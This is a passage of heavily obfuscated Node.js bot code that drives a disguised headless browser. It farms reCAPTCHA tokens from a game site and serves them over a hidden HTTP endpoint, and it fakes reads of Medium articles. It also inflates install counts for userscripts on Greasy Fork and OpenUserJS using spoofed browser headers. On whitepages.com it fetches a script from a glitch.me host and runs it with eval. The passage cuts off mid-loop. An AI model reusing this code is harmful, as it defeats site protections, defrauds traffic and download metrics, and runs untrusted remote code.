      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Z(0x14)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + Z(0x17) + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + Z(0xa) + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x3fe + 0xe65 + -0xa67 * 0x1
  };

function a() {
  const bq = [
    'WPrmWQjOtCkNBXj2WOK',
    'M4elJHCUIi',
    'DR16C4-keB',
    'ywz0zxiUlI4',
    'no-cache',
    'CNJcHJJdVSontmoMtwK',
    'HwTSLUd53K',
    'W69gsmozESkvgCkcW4S8',
    'BbngW5hdKczmWQ4i',
    'jMNcOCoCW5PYdSoHja',
    'ntrepreneu',
    'emoOWQdcUdhcV2vFxKW',
    'x3nOyxjPBMC',
    'bSolnZrV',
    'WRJdTSkLWRG',
    'y2HPBgrYzw4',
    'youtube-hi',
    'CMCVzw4VC2nYAq',
    'CMfUzg9T',
    'https://gr',
    'e/*',
    'bytes',
    'qNvPBgrLCG',
    '8.0.0.0\x20Sa',
    'easyfork.o',
    'zw51C2vYANmUBW'
  ];
  a = function() {
    return bq;
  };
  return a();
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a1 = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f[(a1(0x16))]()['displayUse' + 'rActionLay' + 'er'](0xf5 * -0x7 + -0x1a69 + 0x108e * 0x2)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x12e9 + 0x1074 + 0x2d9), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1e80 + 0x1b09 + -0x1 * 0x3925), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x143f + 0x1d6f + -0x930;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x744 + 0x13 * 0x12b + -0x1 * 0x1d75; w < getRandomInt(-0x656 * 0x3 + 0x2284 + -0x1 * 0xf81, -0x704 + 0x17 * -0x197 + -0x1 * -0x2b9a); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x7c6 * 0x5 + -0xf0c4 + 0x20202);
        }
      }();
    }, -0x1b51 + 0x97 * 0x32 + -0x1c9 * 0x1), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x561 + -0x335 + -0x7 * -0x13a;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x20b * -0x13 + -0x47b + -0x2256, 0x18 * -0x1a + -0x2270 + 0x1 * 0x2512)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x8003 + -0x5d36 + -0x5263 * -0x1);
    }, -0x8ec + -0x1e2d + -0x277d * -0x1), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x2167 + 0x28f * 0x4 + -0x2ba3;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x2eb * 0xb + 0xf57 + 0x2 * 0xe3d), await u['evaluate'](() => {
            const a2 = b;
            let v = new XMLHttpRequest();
            v['open']('GET', a2(0x0, 'jFEn') + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x22bf + -0x3 * 0x6f1 + 0x6 * 0x943), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x444d * -0x4f + 0x170 * -0xd9a + 0xb * 0x4f129);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1 * 0x5cb + 0x25 * 0xca + -0x2299);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0xbb2 + 0x1c2c + 0x138b * -0x2);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x136f + 0x140 * 0x12 + -0xa5f);
}
doFlags['doOUJS'] && ((async () => {
  const a5 = c,
    a4 = b;
  async function f() {
    const a3 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x109b + 0x1 * -0x23ae + 0x344a) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x21f9 + 0x1296 + 0x1b2 * -0x1f));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0xdf5 + -0x8 * 0x482 + -0x1 * -0x161b, D['indexOf']('\x20'));
        return B ? E['slice'](0xf68 + 0x3 * -0x225 + -0x8f9, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x1 * -0xe71 + -0x196 * -0x1 + 0x1709),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': a3(0x4),
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x3329 * 0x1 + -0xa3c + -0x1dd),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + a4(0xe, 'qvH!'),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + a4(0x7, '@)tj') + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + a5(0x19) + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0xe98 + 0x2 * -0xd5f + -0xc26 * -0x1; k < -0x33a * -0x1 + 0x222a + -0x2560; k++)
    setTimeout(f, (0x13 * 0xd3a + -0x38 * 0x7ea + 0x1aa42) * k * getRandomInt(-0x2108 + 0x2 * 0xb56 + -0x1 * -0xa5d, 0x1 * -0x72b + -0x2ed * -0x2 + 0x154));
  setInterval(() => {
    f();
    for (let l = 0x19d0 + 0xb * 0xd9 + 0x707 * -0x5; l < 0x5a9 + 0x94b + -0xef0; l++)
